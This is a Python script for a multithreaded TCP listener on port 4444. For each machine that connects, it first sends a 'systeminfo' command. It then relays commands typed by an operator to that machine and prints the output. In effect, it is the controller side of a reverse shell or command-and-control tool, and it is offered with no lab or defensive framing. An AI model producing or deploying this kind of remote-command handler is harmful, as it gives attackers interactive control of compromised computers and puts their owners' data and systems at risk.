import socket
import threading

# ANSI escape codes for colored terminal output
GREEN = '\033[92m'
RESET = '\033[0m'

def handle_client(client_socket, client_address):
    """Handles an individual client connection."""
    print(f"{GREEN}Connection established with {client_address}{RESET}")
    
    try:
        # Print initial device info
        client_socket.send("systeminfo".encode())
        print(client_socket.recv(4096).decode())

        # Handle command and response loop
        while True:
            command = input(f"{GREEN}Input> {RESET}")

            if command.lower() in ['exit', 'quit']:
                print(f"{GREEN}Closing connection with {client_address}{RESET}")
                client_socket.send(b'exit')
                client_socket.close()
                break
            
            # Send command and receive response
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            print(response)

    except Exception as e:
        print(f"{GREEN}[!] Error with {client_address}: {e}{RESET}")
    finally:
        client_socket.close()
        print(f"{GREEN}Connection closed with {client_address}{RESET}")

def start_listener(host='0.0.0.0', port=4444):
    """Starts the listener for incoming client connections."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)  # Allow up to 5 queued connections

    print(f"{GREEN}Listening for incoming connections on {host}:{port} ...{RESET}")

    try:
        while True:
            # Accept incoming client connections
            client_socket, client_address = server_socket.accept()
            # Handle each connection in a new thread
            client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
            client_thread.start()

    except KeyboardInterrupt:
        print(f"{GREEN}\nShutting down the listener...{RESET}")
    finally:
        server_socket.close()

if __name__ == "__main__":
    start_listener()
